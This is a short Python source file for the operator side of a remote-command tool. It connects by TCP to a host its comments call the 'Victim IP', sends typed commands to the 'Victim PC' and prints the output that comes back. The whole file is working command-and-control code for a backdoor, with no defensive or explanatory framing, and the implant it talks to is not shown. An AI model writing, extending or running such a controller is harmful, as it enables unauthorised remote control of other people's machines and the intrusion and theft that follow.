import os
import socket
import threading
import platform


class Command_Control:
    def __init__(self):
        self.HOST = socket.gethostbyname(socket.gethostname()) # Change this for Victim IP
        self.PORT = 23942
        self.clear_terminal =  "cls" if platform.system() == "Windows" else "clear"
        self.connection()

    def connection(self):
        """Make connection
        """
        socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #IPv4 / TCP
        socket_server.connect((self.HOST, self.PORT))
        
        threading.Thread(target=self.send_commands, args=[socket_server]).start()
        threading.Thread(target=self.receive_response, args=[socket_server]).start()
            
    def send_commands(self, client):
        """Send commands for Victim PC

        Args:
            client (object SOCKET): socket_server
        """
        try:
            while True:
                cmd = input("CMD: ")
                if cmd in ["cls", "clear"]:
                    os.system(self.clear_terminal)
                    continue                
                client.send(cmd.encode("utf-8"))
        except Exception as err:
            print(err)

    def receive_response(self, client):
        """Receive commands response

        Args:
            client (object SOCKET): socket_server
        """
        try:
            while True:
                response = client.recv(4028).decode("latin-1")
                print(response,"\nCMD: ",end="")
        except Exception as err:
            print(err)

Command_Control()